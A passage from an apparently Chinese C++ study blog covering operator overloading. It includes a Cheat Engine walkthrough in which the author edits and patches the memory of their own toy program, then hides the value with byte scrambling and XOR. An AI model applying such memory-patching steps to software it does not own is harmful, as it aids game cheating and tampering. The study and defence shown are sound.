class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bullet::~<span class="built_in">bullet</span>()&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此一来基础模板就形成了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bullet *shota1 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line">bullet *shota2 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line">bullet *shota3 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line">bullet *shota4 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line">bullet *shota5 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; shota1 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; shota2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; shota3 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; shota4 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; shota5 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/06/28/operator7/010.png" class=""><p>首先地址是连贯的，相差0x14，看内存成员算大小。</p><p><strong>然后注意先注释掉之前写的delete的内容不然清除了有点问题。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bullet *shota1 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line">bullet *shota2 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line">bullet *shota3 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line"><span class="keyword">delete</span> shota1;</span><br><span class="line">bullet *shota4 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line">bullet *shota5 = <span class="built_in">new</span> (<span class="string">&quot;it&#x27;s test&quot;</span>) bullet;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; shota1 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; shota2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; shota3 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; shota4 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; shota5 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/06/28/operator7/011.png" class=""><p>然后模拟发射了一颗子弹，让其它的子弹补上来。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>new和delete是配套的。<br>当你重载了new，相对应的就要重载delete。<br>不然你new的方式不同，用默认的delete不一定能释放，而且还会产生bug。</p><p>如果条件允许，你重载了一种就要把其他几种都重载改变。如果真的不想或者用不到，最简单的就是把那种方式<code>=delete;</code></p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重载递增递减运算符</title>
      <link href="/2022/06/28/operator6/"/>
      <url>/2022/06/28/operator6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>递增递减就是通过<code>++、--</code>两个运算符。<br>不过它有特殊的地方就是可以放前面也可以放后面。<br>区别就是先递增后传值，和先传值后递增。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="前置-x2F-–"><a href="#前置-x2F-–" class="headerlink" title="前置++&#x2F;–"></a>前置++&#x2F;–</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法</span></span><br><span class="line">返回类型 <span class="keyword">operator</span>++();</span><br><span class="line">返回类型 <span class="keyword">operator</span>--();</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局函数</span></span><br><span class="line">返回类型 <span class="keyword">operator</span>++(操作数类型 操作数);</span><br><span class="line">返回类型 <span class="keyword">operator</span>--(操作数类型 操作数);</span><br></pre></td></tr></table></figure><p>这就拿之前的hint类做试验了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hint</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *mem[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">hint</span>(<span class="type">int</span> _val = <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>=(<span class="type">int</span> _val);</span><br><span class="line">hint &amp;<span class="keyword">operator</span>++();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~<span class="built_in">hint</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">hint &amp;<span class="keyword">operator</span>--(hint &amp;_val);</span><br></pre></td></tr></table></figure><p>一个做成员一个做全局。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hint &amp;hint::<span class="keyword">operator</span>++()&#123;</span><br><span class="line">*<span class="keyword">this</span> = *<span class="keyword">this</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hint &amp;<span class="keyword">operator</span>--(hint &amp;_val)&#123;</span><br><span class="line">_val = _val - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> _val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前置递增因为是成员函数的关系，它递增后不需要在重新返回一个值，修改原有的就行了，这也是传递引用的原因<br><code>a = ++c + b</code>, c自增就好，不需要额外返回，然后在加上b</p><img src="/2022/06/28/operator6/000.png" class=""><p>效果正常，表达式中也能正常运行。</p><hr><h2 id="后置-x2F-–"><a href="#后置-x2F-–" class="headerlink" title="后置++&#x2F;–"></a>后置++&#x2F;–</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法</span></span><br><span class="line">返回类型 <span class="keyword">operator</span>++(<span class="type">int</span>);</span><br><span class="line">返回类型 <span class="keyword">operator</span>--(<span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局函数</span></span><br><span class="line">返回类型 <span class="keyword">operator</span>++(操作数类型 操作数,<span class="type">int</span>);</span><br><span class="line">返回类型 <span class="keyword">operator</span>--(操作数类型 操作数,<span class="type">int</span>);</span><br></pre></td></tr></table></figure><p>因为符号重载本身差不多，所以标准委员会就来了一手函数重载，用以区分前置和后置。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hint hint::<span class="keyword">operator</span>++(<span class="type">int</span>)&#123;</span><br><span class="line">*<span class="keyword">this</span> = *<span class="keyword">this</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接套是不对的，后置的递增，它是先传值在递增，直接套用前置的做法不可取。</p><p>但是如果要有一个变量接受*this的值，然后*this自增，传回那个变量。<br>理论上可以，但是消耗内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hint hint::<span class="keyword">operator</span>++(<span class="type">int</span>)&#123;</span><br><span class="line">hint _val = *<span class="keyword">this</span>;</span><br><span class="line">*<span class="keyword">this</span> = *<span class="keyword">this</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> _val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/28/operator6/001.png" class=""><p>而且不出意外的报错了。</p><p>因为这个临时构建的变量，它传的是一个hint类型的参数，而我们的构造函数写的是int，那么他就会调用默认的副本构造也就是拷贝函数，拷贝函数的规则不像我们传递int的写法。<br>而它最会执行析构函数的。。析构函数我们就是让他释放了内存，所以会出现问题。</p><p>虽然说尝试用强转的办法<code>hint _val = (int)*this;</code><br>但是最后都要面临一个问题。<br>我主函数main里面定义的时候<code>hint ht&#123;200&#125;;</code><br><code>ht = ht++</code> ht &#x3D; ht ，他又会发生一次副本构造，这就引发问题。</p><p>解决办法有一个不太稳定的，就是删除掉这种默认副本构造函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hint</span>(hint &amp;_val) = <span class="keyword">delete</span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hint hint::<span class="keyword">operator</span>++(<span class="type">int</span>)&#123;</span><br><span class="line">hint _val = (<span class="type">int</span>) * <span class="keyword">this</span>;</span><br><span class="line">*<span class="keyword">this</span> = *<span class="keyword">this</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> _val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/28/operator6/002.png" class=""><p>虽然编译器通过了，但这种做法不见得所有编译器都能通过。</p><p>因为我们强制转换，让*this 变成int的临时变量，然后传递给已经构造好的ht，ht本身也是用int构造的。<br>但是如果去掉了强制转换，也还是会报错，具体原因也不好说，毕竟副本构造都删了，充其量是个用户未定义行为了。</p><p>所以说删除有点麻烦，不如直接重构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint::<span class="built_in">hint</span>(hint &amp;_val) :<span class="built_in">hint</span>((<span class="type">int</span>)_val)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hint hint::<span class="keyword">operator</span>++(<span class="type">int</span>)&#123;</span><br><span class="line">hint _val = *<span class="keyword">this</span>;</span><br><span class="line">*<span class="keyword">this</span> = *<span class="keyword">this</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> _val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一来也省得强制转换。</p><img src="/2022/06/28/operator6/003.png" class=""><p>也符合预期效果。</p><p>减法就省事了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hint <span class="keyword">operator</span>--(hint &amp;_val, <span class="type">int</span>)&#123;</span><br><span class="line">hint val = _val;</span><br><span class="line">--_val;</span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>副本构造函数已经重构了，而且前置–也写过了，省去不少麻烦。</p><img src="/2022/06/28/operator6/004.png" class=""><hr><p>有个蛋疼的，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">125</span>;</span><br><span class="line">++++a;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/06/28/operator6/005.png" class=""><p>它存在这么一种可以用很多对++复合运算。<br>之所以行得通，也是因为它运算的时候<code>(++(++a))</code>,a反正还是左值。</p><p>而<code>a++++</code>就行不通了。因为他是<code>a=a+1, a=a+1</code>,a+1本身是一个右值，语义不通。</p><p>但是我们自己写的类就有这个缺陷，它可以后置++重叠。后置重叠的太多了肯定不利于阅读和理解值。<br><code>a+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</code></p><img src="/2022/06/28/operator6/006.png" class=""><p>因为我们的hint++，他是(b++).++返回值是hint，有调用了一次++函数。</p><p>解决这个也很简单，给返回值修饰为const<br><code>const hint operator++(int);</code></p><p>修饰完了这个，记得修改一下<code>operator int() const;</code><br>否则cout &lt;&lt; 左移运算符的时候，因为是const hint他不知道转成什么。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>优化空间就是其他类型的重载，和const情况下的问题。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】内存修改-CE基础</title>
      <link href="/2022/06/27/gameexpansionCE/"/>
      <url>/2022/06/27/gameexpansionCE/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为游戏的某些数据是有可能存放到本地的，就导致可以通过一些工具检索出内存然后修改。<br>这也是之前单机游戏歪瓜来的方式之一。</p><span id="more"></span><hr><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li>Cheat Engine<br><a href="https://www.cheatengine.org/downloads.php">工具下载</a></li></ul><p>软件汉化文件也在官网download下面，有个ch_cn的中文简单，不会的用谷歌浏览器或者edge翻译<br>软件本身安装的时候有个教程，挺好的可以学一下。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> diamond = <span class="number">2500</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;钻石数量：&quot;</span> &lt;&lt; diamond;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">diamond -= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便写个，就是让钻石每次减少，反正就是变量自减的问题去模拟消费的时候。</p><img src="/2022/06/27/gameexpansionCE/000.png" class=""><p>效果大概就是这样，每次回车减10。</p><p>然后打开ce工具。去找到这个执行的exe程序</p><img src="/2022/06/27/gameexpansionCE/001.png" class=""><hr><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>我的开发环境</p><ol><li>win11</li><li>vs2022</li><li>系统用户默认是管理员</li></ol><p>所以当你以vs2022编译执行.exe的时候，权限太低了，ce抓到了也读不出什么东西。<br>只能打开当前项目文件夹路径找到debug里面的.exe，然后右击管理员执行。这样才能被ce抓到。</p><p>昨晚试了半天，还奇怪软件都官网下的还能有这事。。。一开始还以为是我下的<code>windows terminal</code>的问题。</p><hr><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>以管理员运行exe之后，用ce找到那个exe打开，检索值，因为int类型占用四字节，就不做改变</p><img src="/2022/06/27/gameexpansionCE/003.png" class=""><p>点击首次扫描之后的确看到了一个2500的值，为了印证，我们按任意键减少这个值看看是否发生变化。</p><img src="/2022/06/27/gameexpansionCE/004.png" class=""><p>存在变化，就说明这个地址是我需要的。</p><img src="/2022/06/27/gameexpansionCE/005.png" class=""><p>双击左边栏里的选项，在下面会多出一块，能看到地址和我们手动打印出来的一样。</p><blockquote><p>这里手动打印是因为之前一直找不到，像手动试试也不行，可能就是权限太低了。</p></blockquote><p>然后因为已经找到了地址，我们可以直接改数值。双击下面栏里的数值选项</p><img src="/2022/06/27/gameexpansionCE/006.png" class=""><p>随便修改成多少都行，然后跑cmd里按任意键触发</p><img src="/2022/06/27/gameexpansionCE/007.png" class=""><p>看到变成4990了，是因为触发的时候5000-10了。</p><p><strong>当然这种操作都是本地数据，网络数据会被服务器校正，那些就不是靠这个简单的手法能改的了。</strong></p><p>我们继续右击下面栏的那条内容，找到是什么修改了这个地址</p><img src="/2022/06/27/gameexpansionCE/008.png" class=""><p>然后在cmd按回车触发。</p><img src="/2022/06/27/gameexpansionCE/009.png" class=""><p>当我们触发的时候，里面就有了值。就是简单的汇编代码，点击替换选项能看到mov指令，因为值已经计算好放到eax寄存器了。<br>然后关闭，我们打开显示反汇编程序</p><img src="/2022/06/27/gameexpansionCE/010.png" class=""><p>看到<code>mov [gameCE.diamond],eax</code>之前有一句<code>sub eax,0A</code>,就是eax-10的意思，我们直接将其修改为<code>add eax,0A</code></p><img src="/2022/06/27/gameexpansionCE/011.png" class=""><img src="/2022/06/27/gameexpansionCE/012.png" class=""><p>先停止调试器然后推出，在cmd里继续触发</p><img src="/2022/06/27/gameexpansionCE/013.png" class=""><p>看到值果然开始递增了。</p><hr><p>不过还是那句话，这些事本地的数据，最常见就是单机的游戏，所以单机游戏的歪瓜会好做一些，但是肯定是吃一堑长一智，本地化的数据其实也不会这么透明，很有可能会有加壳之类的操作。</p><p>以int为例，四字节的数据可以拆成四个一字节的数据，然后打乱或者按某种规则排。<br>也可以混淆这个值，比如正常的时候2500，每次运行的时候+500 -500混淆一下。</p><p>构建一个hint类，然后要完成一些加减法重载。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hint</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *mem[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">hint</span>(<span class="type">int</span> _val = <span class="number">0</span>);<span class="comment">//构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>;<span class="comment">//重载int转换</span></span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>=(<span class="type">int</span> _val);<span class="comment">//重载赋值</span></span><br><span class="line"></span><br><span class="line">~<span class="built_in">hint</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hint.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">hint::<span class="built_in">hint</span>(<span class="type">int</span> _val)&#123;</span><br><span class="line"><span class="comment">//1. 1 1 1 1</span></span><br><span class="line"><span class="comment">//2. +500 -500</span></span><br><span class="line"></span><br><span class="line">mem[<span class="number">0</span>] = <span class="keyword">new</span> <span class="type">char</span>;</span><br><span class="line">mem[<span class="number">1</span>] = <span class="keyword">new</span> <span class="type">char</span>;</span><br><span class="line">mem[<span class="number">2</span>] = <span class="keyword">new</span> <span class="type">char</span>;</span><br><span class="line">mem[<span class="number">3</span>] = <span class="keyword">new</span> <span class="type">char</span>;</span><br><span class="line"></span><br><span class="line">*<span class="keyword">this</span> = _val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">hint::<span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//逆运算，主要是反构造函数中的打散情况</span></span><br><span class="line"><span class="type">int</span> _val=<span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *read = (<span class="type">char</span> *)&amp;_val;</span><br><span class="line">read[<span class="number">3</span>] = mem[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">read[<span class="number">1</span>] = mem[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">read[<span class="number">0</span>] = mem[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line">read[<span class="number">2</span>] = mem[<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> _val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> hint::<span class="keyword">operator</span>=(<span class="type">int</span> _val)&#123;</span><br><span class="line"><span class="comment">//四字节拆分打散</span></span><br><span class="line"><span class="type">char</span> *read = (<span class="type">char</span> *)&amp;_val;</span><br><span class="line">mem[<span class="number">0</span>][<span class="number">0</span>] = read[<span class="number">3</span>];</span><br><span class="line">mem[<span class="number">1</span>][<span class="number">0</span>] = read[<span class="number">1</span>];</span><br><span class="line">mem[<span class="number">2</span>][<span class="number">0</span>] = read[<span class="number">0</span>];</span><br><span class="line">mem[<span class="number">3</span>][<span class="number">0</span>] = read[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hint::~<span class="built_in">hint</span>()&#123;</span><br><span class="line"><span class="keyword">delete</span> mem[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">delete</span> mem[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">delete</span> mem[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">delete</span> mem[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本设计就这样，然后跑一下代码也ok的。</p><img src="/2022/06/27/gameexpansionCE/014.png" class=""><p>再次到文件夹目录用管理员打开.exe，然后ce去检索</p><img src="/2022/06/27/gameexpansionCE/015.png" class=""><p>这一次发现2500搜不到了。再往下减也搜不到</p><img src="/2022/06/27/gameexpansionCE/016.png" class=""><p>但是，其实有个范围的值还是能搜到，就是char的范围，只要这个数减小到255以内，就会被检索到了。</p><img src="/2022/06/27/gameexpansionCE/017.png" class=""><p>这里犯了个错误，我用的四字节去搜一字节的内容是不对的。</p><p>重新跑一次</p><img src="/2022/06/27/gameexpansionCE/018.png" class=""><p>当我检索到230的时候发现有一堆值，那就再减一次，果然看到了一个变化的地址。</p><img src="/2022/06/27/gameexpansionCE/019.png" class=""><p>双击选中，看数值是存在变化，说明这个字节的内容就是打散的四个之一。准确来说应该是mem[0];</p><p>因为是mem[0]被发现了，那么给他单独异或操作，那么ce就无法检索出正常值了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">hint::<span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//逆运算，主要是反构造函数中的打散情况</span></span><br><span class="line"><span class="type">int</span> _val=<span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *read = (<span class="type">char</span> *)&amp;_val;</span><br><span class="line">read[<span class="number">3</span>] = mem[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">read[<span class="number">1</span>] = mem[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">read[<span class="number">0</span>] = mem[<span class="number">2</span>][<span class="number">0</span>]^<span class="number">0x23</span>;</span><br><span class="line">read[<span class="number">2</span>] = mem[<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> _val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> hint::<span class="keyword">operator</span>=(<span class="type">int</span> _val)&#123;</span><br><span class="line"><span class="comment">//四字节拆分打散</span></span><br><span class="line"><span class="type">char</span> *read = (<span class="type">char</span> *)&amp;_val;</span><br><span class="line">mem[<span class="number">0</span>][<span class="number">0</span>] = read[<span class="number">3</span>];</span><br><span class="line">mem[<span class="number">1</span>][<span class="number">0</span>] = read[<span class="number">1</span>];</span><br><span class="line">mem[<span class="number">2</span>][<span class="number">0</span>] = read[<span class="number">0</span>]^<span class="number">0x23</span>;</span><br><span class="line">mem[<span class="number">3</span>][<span class="number">0</span>] = read[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完之后编译器先重新编译运行一下看看是否正常<br>然后在管理员运行，用ce捕获</p><img src="/2022/06/27/gameexpansionCE/020.png" class=""><p>老规矩用字节来搜，这里几百个值不管他，不是想要的，挨个减，然后搜</p><img src="/2022/06/27/gameexpansionCE/021.png" class=""><p>大致到了后面其实就找不到了。说明异或保护成功了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>安全措施到位，破解起来花费的时间和精力就更多了。<br>这里的例子比较浅~~后面有时间搞逆向再说，先搞正向就业。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>重载类型转换1</title>
      <link href="/2022/06/27/operatortype1/"/>
      <url>/2022/06/27/operatortype1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在类型转换重载函数前加<code>explicit</code>关键字可以限制该函数禁止使用隐式转换[c++11标准]<br><code>explicit operator int();</code><br>在正常类型直接，比如float x 等于一个 int类型的变量，就会自动发生隐式转换简称隐转，目前就是当类型不同时方便运算。<br>规则好像就是整数由小转大，整数和浮点数比较转浮点。 </p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span 